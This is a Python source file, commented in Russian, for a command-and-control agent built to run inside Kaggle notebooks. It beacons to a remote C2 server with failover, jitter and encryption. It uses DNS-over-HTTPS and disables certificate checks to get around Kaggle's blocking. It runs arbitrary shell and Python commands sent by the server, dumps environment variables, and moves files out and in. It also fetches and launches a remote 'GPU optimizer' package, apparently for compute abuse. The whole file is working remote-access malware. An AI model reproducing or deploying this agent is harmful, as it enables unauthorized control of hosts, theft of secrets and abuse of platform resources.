#!/usr/bin/env python3
"""
C2 Agent — Kaggle Kernel / Notebook (OPTIMIZED v2.0)
- Прямое подключение к C2 серверу
- DoH для обхода DNS блокировок Kaggle  
- GPU optimizer интеграция
- AES-256-GCM шифрование
- Auto-reconnect при падении
- Heartbeat мониторинг
"""

import os, sys, json, time, socket, platform, subprocess, uuid, threading, base64, ssl, struct, hashlib, random, hmac
from urllib.request import Request, urlopen, HTTPSHandler, build_opener
from base64 import b64encode, b64decode
from concurrent.futures import ThreadPoolExecutor

# === CONFIG ===
C2_URL = os.environ.get("C2_URL", "https://gbctwoserver.pages.dev")
C2_BACKUP_URLS = [u for u in os.environ.get("C2_BACKUP_URLS", "").split(",") if u]
AGENT_ID = os.environ.get("AGENT_ID", str(uuid.uuid4()))
SLEEP = int(os.environ.get("SLEEP", "5"))
JITTER = int(os.environ.get("JITTER", "15"))
AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")
ENC_KEY = os.environ.get("ENC_KEY", "")

# Все URL для failover
C2_URLS = [C2_URL] + C2_BACKUP_URLS

# === CRYPTO (AES-256-GCM) ===
def _derive_key(key: str) -> bytes:
    return hashlib.sha256(key.encode()).digest()

def encrypt_data(data: str, key: str) -> str:
    if not key:
        return data
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        nonce = os.urandom(12)
        ct = AESGCM(_derive_key(key)).encrypt(nonce, data.encode(), None)
        return b64encode(nonce + ct).decode()
    except:
        # Fallback XOR
        k = _derive_key(key)
        return b64encode(bytes(b ^ k[i % 32] for i, b in enumerate(data.encode()))).decode()

def decrypt_data(data: str, key: str) -> str:
    if not key:
        return data
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        raw = b64decode(data)
        return AESGCM(_derive_key(key)).decrypt(raw[:12], raw[12:], None).decode()
    except:
        k = _derive_key(key)
        return bytes(b ^ k[i % 32] for i, b in enumerate(b64decode(data))).decode()

def sign_data(data: str, key: str) -> str:
    return hmac.new(key.encode(), data.encode(), hashlib.sha256).hexdigest()

# === DoH RESOLVER (Kaggle DNS bypass) ===
def doh_resolve(hostname):
    """DNS over HTTPS - обходит DNS блокировки Kaggle"""
    try:
        doh_url = "https://1.1.1.1/dns-query"
        qname = b"".join(bytes([len(p)]) + p.encode() for p in hostname.split(".")) + b"\x00"
        query = struct.pack(">HHHHHH", 0, 0x0100, 1, 0, 0, 0) + qname + struct.pack(">HH", 1, 1)
        encoded = base64.urlsafe_b64encode(query).decode().rstrip("=")
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        opener = build_opener(HTTPSHandler(context=ctx))
        resp = opener.open(Request(f"{doh_url}?dns={encoded}", 
            headers={"Accept": "application/dns-message", "User-Agent": "curl"}), timeout=10)
        dns = resp.read()
        ancount = struct.unpack(">H", dns[6:8])[0]
        pos = 12
        while pos < len(dns) and dns[pos] != 0:
            pos += dns[pos] + 1
        pos += 5
        for _ in range(ancount):
            if dns[pos] >= 0xC0:
                pos += 2
            else:
                while dns[pos] != 0:
                    pos += dns[pos] + 1
                pos += 1
            rtype, rclass, ttl, rdlen = struct.unpack(">HHIH", dns[pos:pos+10])
            pos += 10
            if rtype == 1 and rdlen == 4:
                return ".".join(str(b) for b in dns[pos:pos+4])
            pos += rdlen
    except:
        pass
    return None

# === HTTP CLIENT ===
def http_request(path, data, method="POST", retries=3):
    """HTTP запрос с failover и шифрованием"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = build_opener(HTTPSHandler(context=ctx))
    
    # Подготовка данных
    json_data = json.dumps(data)
    
    # Шифрование если есть ключ
    if ENC_KEY:
        payload = encrypt_data(json_data, ENC_KEY)
        headers = {
            "Content-Type": "text/plain",
            "User-Agent": "Mozilla/5.0",
            "X-Enc": "1",
            "X-Sig": sign_data(payload, ENC_KEY)
        }
    else:
        payload = json_data
        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    
    # Auth token
    if AUTH_TOKEN:
        headers["X-Auth-Token"] = AUTH_TOKEN
    
    # Failover по всем URL
    last_error = None
    for url in C2_URLS:
        for attempt in range(retries):
            try:
                req = Request(f"{url}{path}", data=payload.encode() if isinstance(payload, str) else payload, headers=headers, method=method)
                resp = opener.open(req, timeout=30)
                raw = resp.read().decode()
                
                # Дешифрование если нужно
                if ENC_KEY and raw.startswith("eyJ"):  # base64
                    try:
                        raw = decrypt_data(raw, ENC_KEY)
                    except:
                        pass
                
                return json.loads(raw)
            except Exception as e:
                last_error = e
                time.sleep(2 ** attempt)  # exponential backoff
    
    raise Exception(f"All C2 URLs failed: {last_error}")

# === GPU INFO ===
def get_gpu_info():
    """Получить информацию о GPU"""
    info = {"available": False, "name": "No GPU", "memory": "N/A", "cuda_version": "N/A"}
    
    # nvidia-smi
    try:
        out = subprocess.check_output(
            "nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader 2>/dev/null",
            shell=True, timeout=5
        ).decode().strip()
        if out:
            parts = [p.strip() for p in out.split(",")]
            info["available"] = True
            info["name"] = parts[0] if len(parts) > 0 else "Unknown"
            info["memory"] = parts[1] if len(parts) > 1 else "N/A"
            info["driver"] = parts[2] if len(parts) > 2 else "N/A"
    except:
        pass
    
    # PyTorch
    try:
        import torch
        if torch.cuda.is_available():
            info["available"] = True
            info["name"] = torch.cuda.get_device_name(0)
            info["memory"] = f"{torch.cuda.get_device_properties(0).total_memory // 1024**3}GB"
            info["cuda_version"] = torch.version.cuda
            info["torch_version"] = torch.__version__
    except:
        pass
    
    return info

# === SYSTEM INFO ===
def get_system_info():
    """Полная информация о системе"""
    info = {
        "hostname": socket.gethostname(),
        "username": subprocess.check_output("whoami", shell=True, timeout=5).decode().strip(),
        "os": f"Kaggle {platform.system()} {platform.release()}",
        "arch": platform.machine(),
        "python": platform.python_version(),
        "cpu_count": os.cpu_count(),
        "gpu": get_gpu_info(),
        "cwd": os.getcwd(),
        "kaggle_url": os.environ.get("KAGGLE_URL_BASE", "N/A"),
    }
    
    # Memory
    try:
        with open("/proc/meminfo") as f:
            for line in f:
                if line.startswith("MemTotal"):
                    info["mem_total_mb"] = int(line.split()[1]) // 1024
                elif line.startswith("MemAvailable"):
                    info["mem_available_mb"] = int(line.split()[1]) // 1024
    except:
        pass
    
    # Disk
    try:
        df = subprocess.check_output("df -h / 2>/dev/null | tail -1", shell=True, timeout=5).decode()
        parts = df.split()
        if len(parts) >= 4:
            info["disk_total"] = parts[1]
            info["disk_used"] = parts[2]
            info["disk_avail"] = parts[3]
    except:
        pass
    
    return info

# === REGISTER ===
def register():
    """Регистрация на C2 сервере"""
    sys_info = get_system_info()
    
    data = {
        "id": AGENT_ID,
        "hostname": sys_info["hostname"],
        "username": sys_info["username"],
        "os": sys_info["os"],
        "arch": f"{sys_info['arch']} | {sys_info['gpu']['name']}",
        "ip_internal": socket.gethostbyname(socket.gethostname()),
        "platform_type": "kaggle",
        "gpu_available": sys_info["gpu"]["available"],
        "gpu_name": sys_info["gpu"]["name"],
        "gpu_memory": sys_info["gpu"]["memory"],
        "cpu_count": sys_info["cpu_count"],
        "mem_total_mb": sys_info.get("mem_total_mb", 0),
    }
    
    return http_request("/api/agent/register", data)

# === HEARTBEAT ===
def send_heartbeat():
    """Отправить heartbeat"""
    return http_request("/api/agent/heartbeat", {"id": AGENT_ID, "status": "alive"})

# === TASK EXECUTOR ===
def execute_task(task):
    """Выполнение задачи от C2"""
    tt = task.get("task_type", "cmd")
    payload = task.get("payload", "")
    task_id = task.get("id", "")
    
    print(f"[C2] Executing task {task_id}: {tt}")
    
    try:
        if tt == "cmd":
            # Shell команда
            result = subprocess.check_output(
                payload, shell=True, stderr=subprocess.STDOUT, timeout=300
            ).decode(errors="replace")
            return result or "OK"
        
        elif tt == "python":
            # Python код
            import io
            buf = io.StringIO()
            old_stdout = sys.stdout
            sys.stdout = buf
            try:
                exec(compile(payload, "<c2>", "exec"), {"__builtins__": __builtins__, "task_id": task_id})
                return buf.getvalue() or "executed (no output)"
            finally:
                sys.stdout = old_stdout
        
        elif tt == "sysinfo":
            return json.dumps(get_system_info(), indent=2)
        
        elif tt == "gpu":
            return json.dumps(get_gpu_info(), indent=2)
        
        elif tt == "env":
            return "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items()))
        
        elif tt == "ls":
            target = payload.strip() or "."
            items = []
            for x in sorted(os.listdir(target)):
                path = os.path.join(target, x)
                size = os.path.getsize(path) if os.path.isfile(path) else 0
                items.append(f"{'d' if os.path.isdir(path) else '-'} {x} ({size})")
            return "\n".join(items)
        
        elif tt == "download":
            if os.path.exists(payload):
                with open(payload, "rb") as f:
                    return f"[b64:{payload}] " + b64encode(f.read()).decode()
            return f"File not found: {payload}"
        
        elif tt == "upload":
            parts = payload.split("|", 1)
            if len(parts) == 2:
                path, b64data = parts
                os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
                with open(path, "wb") as f:
                    f.write(base64.b64decode(b64data))
                return f"Written to {path}"
        
        elif tt == "optimizer_start":
            # Запуск GPU optimizer
            return start_optimizer(payload)
        
        elif tt == "optimizer_stop":
            return stop_optimizer()
        
        elif tt == "optimizer_status":
            return get_optimizer_status()
        
        elif tt == "kill":
            http_request("/api/agent/result", {"task_id": task_id, "result": "Agent terminated"})
            os._exit(0)
        
        else:
            return f"Unknown task type: {tt}"
    
    except subprocess.TimeoutExpired:
        return "[timeout exceeded]"
    except Exception as e:
        return f"[error] {type(e).__name__}: {e}"

# === GPU OPTIMIZER ===
_optimizer_process = None

def start_optimizer(config=""):
    """Запуск GPU optimizer"""
    global _optimizer_process
    
    if _optimizer_process and _optimizer_process.poll() is None:
        return "Optimizer already running"
    
    # Установка если нужно
    try:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "-q", 
             "git+https://github.com/GaredBerns/C2_server"],
            check=False, timeout=120
        )
    except:
        pass
    
    # Запуск
    cmd = "c2-optimizer || python3 -m optimizer.cli"
    _optimizer_process = subprocess.Popen(
        cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT
    )
    
    return f"Optimizer started (PID: {_optimizer_process.pid})"

def stop_optimizer():
    """Остановка optimizer"""
    global _optimizer_process
    
    subprocess.run("pkill -f 'c2-optimizer' 2>/dev/null", shell=True)
    subprocess.run("pkill -f 'optimizer.cli' 2>/dev/null", shell=True)
    
    if _optimizer_process:
        _optimizer_process.terminate()
        _optimizer_process = None
    
    return "Optimizer stopped"

def get_optimizer_status():
    """Статус optimizer"""
    try:
        result = subprocess.run(
            "pgrep -af 'c2-optimizer|optimizer.cli' 2>/dev/null",
            shell=True, capture_output=True, text=True
        )
        if result.returncode == 0 and result.stdout.strip():
            return f"RUNNING: {result.stdout.strip()}"
    except:
        pass
    return "NOT_RUNNING"

# === BEACON LOOP ===
def beacon_loop():
    """Основной цикл связи с C2"""
    _sleep = SLEEP
    _jitter = JITTER
    consecutive_errors = 0
    max_errors = 5
    
    while True:
        try:
            resp = http_request("/api/agent/beacon", {"id": AGENT_ID})
            consecutive_errors = 0
            
            # Обновление настроек
            _sleep = int(resp.get("sleep", _sleep))
            _jitter = int(resp.get("jitter", _jitter))
            
            # Выполнение задач
            tasks = resp.get("tasks", [])
            for task in tasks:
                result = execute_task(task)
                if len(result) > 65000:
                    result = result[:65000] + "\n[...truncated]"
                
                http_request("/api/agent/result", {
                    "task_id": task["id"],
                    "result": result,
                    "agent_id": AGENT_ID
                })
        
        except Exception as e:
            consecutive_errors += 1
            print(f"[C2] Beacon error ({consecutive_errors}/{max_errors}): {e}")
            
            if consecutive_errors >= max_errors:
                # Re-register после множественных ошибок
                time.sleep(30)
                try:
                    register()
                    consecutive_errors = 0
                except:
                    pass
        
        # Sleep с jitter
        jitter_s = _sleep * _jitter / 100
        sleep_time = max(1, _sleep + random.uniform(-jitter_s, jitter_s))
        time.sleep(sleep_time)

# === HEARTBEAT THREAD ===
def heartbeat_loop():
    """Периодический heartbeat"""
    while True:
        try:
            send_heartbeat()
        except:
            pass
        time.sleep(60)

# === MAIN ===
if __name__ == "__main__":
    print("=" * 60)
    print("[C2] Kaggle Agent v2.0 - OPTIMIZED")
    print(f"[C2] Agent ID: {AGENT_ID}")
    print(f"[C2] C2 URL: {C2_URL}")
    print(f"[C2] Backup URLs: {len(C2_BACKUP_URLS)}")
    print(f"[C2] Encryption: {'ENABLED' if ENC_KEY else 'DISABLED'}")
    print(f"[C2] Auth Token: {'SET' if AUTH_TOKEN else 'NOT SET'}")
    print("=" * 60)
    
    # Регистрация
    try:
        reg_result = register()
        print(f"[C2] Registered: {reg_result.get('status', 'unknown')}")
    except Exception as e:
        print(f"[C2] Registration failed: {e}")
    
    # GPU info
    gpu = get_gpu_info()
    print(f"[C2] GPU: {gpu['name']} ({gpu['memory']})")
    
    # Запуск beacon loop
    beacon_thread = threading.Thread(target=beacon_loop, daemon=True)
    beacon_thread.start()
    
    # Запуск heartbeat
    heartbeat_thread = threading.Thread(target=heartbeat_loop, daemon=True)
    heartbeat_thread.start()
    
    # Keep alive
    print("[C2] Agent running...")
    while True:
        time.sleep(60)
